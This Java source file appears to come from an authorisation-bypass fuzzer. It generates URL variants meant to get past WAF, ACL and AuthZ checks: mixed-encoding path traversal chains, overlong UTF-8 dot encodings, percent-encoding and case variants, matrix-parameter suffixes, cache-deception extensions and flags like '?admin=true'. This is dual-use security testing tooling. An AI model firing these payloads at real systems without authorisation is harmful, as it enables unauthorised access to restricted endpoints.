package com.bypassfuzzer.core.payloads;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Generates URL/path manipulation payloads by injecting patterns into each path segment.
 *
 * For URL: https://example.com/test1/test2/test3
 * And payload: "../"
 * Generates:
 * - ../test1/test2/test3
 * - test1../test2/test3
 * - ../test1../test2/test3
 * - test1/../test2/test3
 * - etc.
 */
public class UrlPayloadProcessor {

    private final String targetUrl;
    private final URI uri;
    private final List<String> pathSegments;

    public UrlPayloadProcessor(String targetUrl) throws URISyntaxException {
        this.targetUrl = targetUrl;
        this.uri = new URI(targetUrl);
        this.pathSegments = parsePathSegments(uri.getPath());
    }

    /**
     * Generate all URL payload permutations.
     *
     * @param urlPayloads List of URL encoding/manipulation patterns
     * @return List of complete URLs with payloads applied
     */
    public List<String> generateUrlPayloads(List<String> urlPayloads) {
        Set<String> allPaths = new LinkedHashSet<>();

        // Parse classification tags, expand case variants, and keep class info per payload.
        List<Classified> classified = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (String line : urlPayloads) {
            Classified cp = parseClassifiedPayload(line);
            for (String variant : expandCaseVariants(cp.payload)) {
                String key = cp.classes + "|" + variant;
                if (seen.add(key)) {
                    classified.add(new Classified(cp.classes, variant));
                }
            }
        }

        // Auto-generated cross-encoding traversal chains: mix different encoding styles
        // in one payload (e.g. ../..%2f) to hit parser-diff bugs where layer 1 decodes
        // %2f but layer 2 doesn't (nginx alias, Spring routing, CDN-vs-origin desyncs).
        // PREFIX + HEAD only: mid-path BETWEEN insertion of traversal reroutes off
        // the target endpoint, defeating the AuthZ-bypass purpose.
        Set<InjectionClass> chainClasses = EnumSet.of(InjectionClass.PREFIX, InjectionClass.HEAD);
        for (String chain : generateCrossEncodingChains()) {
            for (String variant : expandCaseVariants(chain)) {
                String key = chainClasses + "|" + variant;
                if (seen.add(key)) {
                    classified.add(new Classified(chainClasses, variant));
                }
            }
        }

        for (Classified cp : classified) {
            String payload = cp.payload;
            // Traversal payloads mid-path reroute off the target endpoint. Restrict them
            // to segment-0 PREFIX; skip SUFFIX/SANDWICH entirely (they also drift off).
            boolean traversal = isTraversalLike(payload);

            for (int i = 0; i < pathSegments.size(); i++) {
                String segment = pathSegments.get(i);
                if (cp.classes.contains(InjectionClass.PREFIX)
                        && !(traversal && i > 0)) {
                    List<String> ns = new ArrayList<>(pathSegments);
                    ns.set(i, payload + segment);
                    allPaths.add(String.join("/", ns));
                }
                if (cp.classes.contains(InjectionClass.SUFFIX) && !traversal) {
                    List<String> ns = new ArrayList<>(pathSegments);
                    ns.set(i, segment + payload);
                    allPaths.add(String.join("/", ns));
                }
                if (cp.classes.contains(InjectionClass.SANDWICH) && !traversal) {
                    List<String> ns = new ArrayList<>(pathSegments);
                    ns.set(i, payload + segment + payload);
                    allPaths.add(String.join("/", ns));
                }
            }

            if (cp.classes.contains(InjectionClass.BETWEEN)) {
                for (int i = 0; i <= pathSegments.size(); i++) {
                    List<String> ns = new ArrayList<>(pathSegments);
                    ns.add(i, payload);
                    allPaths.add(String.join("/", ns));
                }
            }

            if (cp.classes.contains(InjectionClass.HEAD)) {
                List<String> ns = new ArrayList<>(pathSegments);
                ns.add(0, payload);
                allPaths.add(String.join("/", ns));
            }
        }

        // Insert standalone dot/matrix marker segments at each internal path
        // boundary. Some routing stacks discard these markers while an upstream
        // ACL sees a different raw path, e.g. /v1/;/console/;/plus. Emit each
        // boundary independently, around each path segment, and cumulatively.
        addStandaloneNormalizationMarkerVariants(allPaths);

        // Per-segment case expansion (deterministic, bounded cartesian via LETTER_CAP).
        // Catches case-insensitive routing bypasses like /Admin vs /admin on IIS /
        // misconfigured Spring regex / CDN-vs-origin case desyncs.
        for (int i = 0; i < pathSegments.size(); i++) {
            for (String variant : expandSegmentCase(pathSegments.get(i))) {
                List<String> ns = new ArrayList<>(pathSegments);
                ns.set(i, variant);
                allPaths.add(String.join("/", ns));
            }
        }

        // Whole-path all-upper / all-lower. Catches WAF rules that normalize partial
        // case but miss /ADMIN/V1/USERS-style fully-uppercased paths.
        if (!pathSegments.isEmpty()) {
            List<String> upper = new ArrayList<>(pathSegments.size());
            List<String> lower = new ArrayList<>(pathSegments.size());
            for (String seg : pathSegments) {
                upper.add(seg.toUpperCase());
                lower.add(seg.toLowerCase());
            }
            allPaths.add(String.join("/", upper));
            allPaths.add(String.join("/", lower));
        }

        // Per-character percent-encoding of target segments. Bypasses WAF rules that
        // match the raw segment text exactly (/admin) but are applied BEFORE the
        // URL decoder runs — /%61dmin decodes to /admin on origin but looks different
        // to a literal-match ACL. expandCaseVariants below ensures hex case variance.
        for (int segIdx = 0; segIdx < pathSegments.size(); segIdx++) {
            String seg = pathSegments.get(segIdx);
            for (String encoded : expandCharEncodedVariants(seg)) {
                List<String> ns = new ArrayList<>(pathSegments);
                ns.set(segIdx, encoded);
                String joined = String.join("/", ns);
                allPaths.addAll(expandCaseVariants(joined));
            }
        }

        // Add query/extension suffix payloads to the last segment
        List<String> suffixPayloads = new ArrayList<>();
        if (!pathSegments.isEmpty()) {
            suffixPayloads = generateSuffixPayloads();
            for (String suffix : suffixPayloads) {
                List<String> newSegments = new ArrayList<>(pathSegments);
                newSegments.set(newSegments.size() - 1, pathSegments.get(pathSegments.size() - 1) + suffix);
                allPaths.add(String.join("/", newSegments));
            }
        }

        // Convert paths back to full URLs
        return convertPathsToUrls(new ArrayList<>(allPaths), suffixPayloads);
    }

    private void addStandaloneNormalizationMarkerVariants(Set<String> allPaths) {
        if (pathSegments.size() < 2) {
            return;
        }

        for (String marker : StandalonePathMarkerVariants.all()) {
            for (int boundary = 1; boundary < pathSegments.size(); boundary++) {
                List<String> variant = new ArrayList<>(pathSegments);
                variant.add(boundary, marker);
                allPaths.add(String.join("/", variant));
            }

            for (int target = 0; target < pathSegments.size(); target++) {
                List<String> surrounded = new ArrayList<>(pathSegments.size() + 2);
                for (int index = 0; index < pathSegments.size(); index++) {
                    if (index == target) {
                        surrounded.add(marker);
                    }
                    surrounded.add(pathSegments.get(index));
                    if (index == target) {
                        surrounded.add(marker);
                    }
                }
                allPaths.add(String.join("/", surrounded));
            }

            List<String> cumulative = new ArrayList<>(pathSegments.size() * 2 - 1);
            for (int index = 0; index < pathSegments.size(); index++) {
                if (index > 0) {
                    cumulative.add(marker);
                }
                cumulative.add(pathSegments.get(index));
            }
            allPaths.add(String.join("/", cumulative));
        }
    }

    // Injection pattern for a payload.
    //   PREFIX/SUFFIX/SANDWICH: modify a path segment in place.
    //   HEAD:    insert payload as a new first segment (before all others).
    //            Safe for traversal payloads — /..;/admin still normalizes to /admin.
    //   BETWEEN: insert payload at every position between segments. Safe only for
    //            no-op payloads (., %2e) — traversal mid-path reroutes off-target.
    enum InjectionClass { PREFIX, SUFFIX, SANDWICH, BETWEEN, HEAD }

    // Traversal primitives with different encoding styles. Cross-chaining two unlike
    // primitives in one payload produces parser-diff bugs against stacks that decode
    // encodings inconsistently across layers.
    private static final String[] TRAVERSAL_PRIMITIVES = {
            "../", "..%2f", "..;/", "%2e%2e/", "%2e%2e%2f"
    };

    /**
     * Generate per-character percent-encoded variants of a single path segment.
     * Emits: each char encoded once (single level), each char encoded twice
     * (double level), and the whole segment fully encoded.
     * Only encodes printable ASCII alphanum and common path chars; non-ASCII bytes
     * are skipped (would need UTF-8 byte-level encoding which we don't model here).
     */
    static List<String> expandCharEncodedVariants(String segment) {
        LinkedHashSet<String> out = new LinkedHashSet<>();
        for (int i = 0; i < segment.length(); i++) {
            char c = segment.charAt(i);
            if (!encodableChar(c)) continue;
            String pfx = segment.substring(0, i);
            String sfx = segment.substring(i + 1);
            out.add(pfx + String.format("%%%02x", (int) c) + sfx);
            out.add(pfx + String.format("%%25%02x", (int) c) + sfx);
        }
        StringBuilder full = new StringBuilder();
        for (char c : segment.toCharArray()) {
            if (encodableChar(c)) {
                full.append(String.format("%%%02x", (int) c));
            } else {
                full.append(c);
            }
        }
        out.add(full.toString());
        return new ArrayList<>(out);
    }

    private static boolean encodableChar(char c) {
        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
                || (c >= '0' && c <= '9')
                || c == '.' || c == '_' || c == '-';
    }

    /**
     * Heuristic: does this payload represent a traversal operation (contains '..' in
     * some encoded or literal form)? Such payloads are off-target when PREFIX-injected
     * into mid-path segments (/api/../admin -> /admin, wrong endpoint for AuthZ bypass
     * of /api/admin) and always off-target for SUFFIX/SANDWICH. We allow them only at
     * segment 0 via PREFIX, plus HEAD insertion (which callers tag explicitly as [h]).
     */
    static boolean isTraversalLike(String payload) {
        String s = payload.toLowerCase();
        return s.contains("..")
                || s.contains("%2e%2e")
                || s.contains("%252e%252e")
                || s.contains(".%2e") || s.contains("%2e.")
                || s.contains(".%c0%ae") || s.contains("%c0%ae.")
                || s.contains("%c0%ae%c0%ae")
                || s.contains("%e0%80%ae%e0%80%ae")
                || s.contains("%f0%80%80%ae%f0%80%80%ae")
                || s.contains("%ef%bc%8e%ef%bc%8e");
    }

    static List<String> generateCrossEncodingChains() {
        List<String> out = new ArrayList<>();
        // 2-chains: heterogeneous pair (a != b). Catches 1-layer parser-diff.
        for (String a : TRAVERSAL_PRIMITIVES) {
            for (String b : TRAVERSAL_PRIMITIVES) {
                if (!a.equals(b)) {
                    out.add(a + b);
                }
            }
        }
        // 3-chains: all three distinct. Targets WAF/proxy stacks with normalizer
        // depth limits that bail out after 1-2 passes — the leftover mismatched
        // encoding gets forwarded verbatim and origin keeps normalizing to target.
        for (String a : TRAVERSAL_PRIMITIVES) {
            for (String b : TRAVERSAL_PRIMITIVES) {
                if (a.equals(b)) continue;
                for (String c : TRAVERSAL_PRIMITIVES) {
                    if (c.equals(a) || c.equals(b)) continue;
                    out.add(a + b + c);
                }
            }
        }
        return out;
    }

    private static final Set<InjectionClass> DEFAULT_CLASSES =
            Collections.unmodifiableSet(EnumSet.of(
                    InjectionClass.PREFIX, InjectionClass.SUFFIX, InjectionClass.SANDWICH));

    // Line tag: [flags]<payload>. Flags: p/s/w/b/h (single classes) or a (all five).
    private static final Pattern TAG_RE = Pattern.compile("^\\[([pswbah]+)\\](.+)$");

    static final class Classified {
        final Set<InjectionClass> classes;
        final String payload;
        Classified(Set<InjectionClass> classes, String payload) {
            this.classes = classes;
            this.payload = payload;
        }
    }

    static Classified parseClassifiedPayload(String line) {
        Matcher m = TAG_RE.matcher(line);
        if (!m.matches()) {
            return new Classified(DEFAULT_CLASSES, line);
        }
        EnumSet<InjectionClass> cs = EnumSet.noneOf(InjectionClass.class);
        for (char c : m.group(1).toCharArray()) {
            switch (c) {
                case 'p': cs.add(InjectionClass.PREFIX); break;
                case 's': cs.add(InjectionClass.SUFFIX); break;
                case 'w': cs.add(InjectionClass.SANDWICH); break;
                case 'b': cs.add(InjectionClass.BETWEEN); break;
                case 'h': cs.add(InjectionClass.HEAD); break;
                case 'a': cs.addAll(EnumSet.allOf(InjectionClass.class)); break;
            }
        }
        return new Classified(cs, m.group(2));
    }

    // Captures the 2-hex-digit payload of a single- or double-level percent-encoding.
    // %XX matches the inner hex; %25XX matches the inner hex of a double-encoded form
    // (important for decoder-case bugs like React's %252F vs %252f).
    private static final Pattern PCT_TRIPLET = Pattern.compile("%(?:25)?([0-9a-fA-F]{2})");
    // 2^LETTER_CAP is the max variants emitted per payload via full Cartesian expansion.
    // Beyond the cap we fall back to just [all-lower-hex, all-upper-hex].
    private static final int LETTER_CAP = 4;

    /**
     * Emit case variants of every %XX triplet in the payload. Digits are left alone,
     * hex letters (a-f/A-F) are toggled independently. Input payload is always kept
     * verbatim. Bounded expansion: up to 2^LETTER_CAP full variants, otherwise just
     * the original + all-lower + all-upper.
     */
    static List<String> expandCaseVariants(String payload) {
        List<Integer> letterPositions = new ArrayList<>();
        Matcher m = PCT_TRIPLET.matcher(payload);
        while (m.find()) {
            for (int i = m.start(1); i < m.end(1); i++) {
                char c = payload.charAt(i);
                if ((c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
                    letterPositions.add(i);
                }
            }
        }
        if (letterPositions.isEmpty()) {
            return Collections.singletonList(payload);
        }

        LinkedHashSet<String> out = new LinkedHashSet<>();
        out.add(payload);
        int n = letterPositions.size();

        if (n <= LETTER_CAP) {
            for (int mask = 0; mask < (1 << n); mask++) {
                out.add(applyLetterCase(payload, letterPositions, mask));
            }
        } else {
            out.add(applyLetterCase(payload, letterPositions, 0));
            out.add(applyLetterCase(payload, letterPositions, (1 << n) - 1));
        }
        return new ArrayList<>(out);
    }

    private static String applyLetterCase(String payload, List<Integer> positions, int mask) {
        StringBuilder sb = new StringBuilder(payload);
        for (int i = 0; i < positions.size(); i++) {
            int pos = positions.get(i);
            char c = payload.charAt(pos);
            boolean upper = ((mask >> i) & 1) == 1;
            sb.setCharAt(pos, upper ? Character.toUpperCase(c) : Character.toLowerCase(c));
        }
        return sb.toString();
    }

    private List<String> parsePathSegments(String path) {
        if (path == null || path.isEmpty() || path.equals("/")) {
            return new ArrayList<>();
        }

        String[] parts = path.split("/");
        List<String> segments = new ArrayList<>();
        for (String part : parts) {
            if (!part.isEmpty()) {
                segments.add(part);
            }
        }
        return segments;
    }

    /**
     * Deterministic case expansion across all ASCII letters in a segment name (e.g.
     * 'api' -> {'api','Api','aPi','ApI','apI','aPI','API','ApI'...} up to 2^LETTER_CAP,
     * falling back to {all-lower, all-upper} beyond the cap). Sibling of
     * expandCaseVariants, which only targets hex letters inside %XX triplets.
     */
    static List<String> expandSegmentCase(String segment) {
        List<Integer> letterPositions = new ArrayList<>();
        for (int i = 0; i < segment.length(); i++) {
            if (Character.isLetter(segment.charAt(i))) {
                letterPositions.add(i);
            }
        }
        if (letterPositions.isEmpty()) {
            return Collections.singletonList(segment);
        }
        int n = letterPositions.size();
        LinkedHashSet<String> out = new LinkedHashSet<>();
        if (n <= LETTER_CAP) {
            for (int mask = 0; mask < (1 << n); mask++) {
                out.add(applyLetterCase(segment, letterPositions, mask));
            }
        } else {
            out.add(applyLetterCase(segment, letterPositions, 0));
            out.add(applyLetterCase(segment, letterPositions, (1 << n) - 1));
        }
        return new ArrayList<>(out);
    }

    private List<String> generateSuffixPayloads() {
        List<String> baseSuffixes = Arrays.asList(
            "?debug=true",
            "?admin=true",
            "?user=admin",
            "?detail=true",
            ".html",
            "?.html",
            "%3f.html",
            ".json",
            "?.json",
            "%3f.json",
            ".php",
            "?.php",
            "%3f.php",
            "?wsdl",
            "/application.wadl?detail=true",
            // Cache-deception extensions (Tiurin ZeroNights 2018: Varnish
            // `req.url ~ "\.(gif|jpg|jpeg|swf|css|js)(\?.*)$"` regex bypasses
            // where the origin routes to /target but the cache stores the
            // response keyed to an asset-looking URL).
            "?.jpeg",
            "?.jpg",
            "?.png",
            "?.gif",
            "?.css",
            "?.js",
            // Cloudflare-style extension-before-? cache check.
            "/.jpeg",
            "/.jpg",
            "/.png",
            "/.gif",
            "/.css",
            "/.js"
        );

        Set<String> allSuffixes = new LinkedHashSet<>(baseSuffixes);
        allSuffixes.addAll(generateMatrixFormatSuffixes());

        // Deterministic case expansion (was: 3 random variants per suffix)
        for (String suffix : new ArrayList<>(allSuffixes)) {
            allSuffixes.addAll(expandSegmentCase(suffix));
        }

        return new ArrayList<>(allSuffixes);
    }

    private List<String> generateMatrixFormatSuffixes() {
        Set<String> suffixes = new LinkedHashSet<>();

        // Matrix/content-negotiation suffixes. These target parser
        // differentials where auth middleware sees an asset/API format suffix
        // but the framework strips semicolon path parameters before routing,
        // e.g. /account;.json dispatches to /account.
        for (String extension : loadExtensionSuffixes()) {
            suffixes.add(";" + extension);
            suffixes.add("%3b" + extension);
            suffixes.add(extension + ";");
            suffixes.add(extension + ";jsessionid=1");
            suffixes.add(extension + ";foo=bar");
        }

        return new ArrayList<>(suffixes);
    }

    private List<String> loadExtensionSuffixes() {
        Set<String> extensions = new LinkedHashSet<>();
        try {
            PayloadLoader.loadPayloads("extension_payloads.txt").stream()
                .filter(extension -> extension != null && !extension.isBlank())
                .map(String::trim)
                .map(extension -> extension.startsWith(".") ? extension : "." + extension)
                .forEach(extensions::add);
        } catch (RuntimeException e) {
            extensions.addAll(List.of(".json", ".html", ".xml", ".txt", ".php"));
        }
        extensions.addAll(List.of(".jpeg", ".jpg", ".png", ".gif", ".css", ".js"));
        return new ArrayList<>(extensions);
    }

    private List<String> convertPathsToUrls(List<String> paths, List<String> suffixPayloads) {
        // Build URLs via raw string assembly. Java's URI(scheme,authority,path,query,fragment)
        // constructor re-escapes '%' to '%25', which destroys every %-encoded payload
        // (%2e -> %252e, case variants collapse, etc.). We need bytes on the wire to match
        // what's in url_payloads.txt exactly.
        List<String> urls = new ArrayList<>();
        String originalQuery = uri.getQuery();
        String base = uri.getScheme() + "://" + uri.getAuthority();

        for (String path : paths) {
            String lastSegment = path.substring(path.lastIndexOf('/') + 1);
            boolean hasQuerySuffix = suffixPayloads.stream().anyMatch(lastSegment::contains);

            if (hasQuerySuffix) {
                urls.add(base + "/" + path);

                if (originalQuery != null && !originalQuery.isEmpty() &&
                    (lastSegment.contains("?") || lastSegment.toLowerCase().contains("%3f"))) {
                    urls.add(base + "/" + path + "&" + originalQuery);
                }
            } else if (originalQuery != null && !originalQuery.isEmpty()) {
                urls.add(base + "/" + path + "?" + originalQuery);
            } else {
                urls.add(base + "/" + path);
            }
        }

        return urls;
    }
}
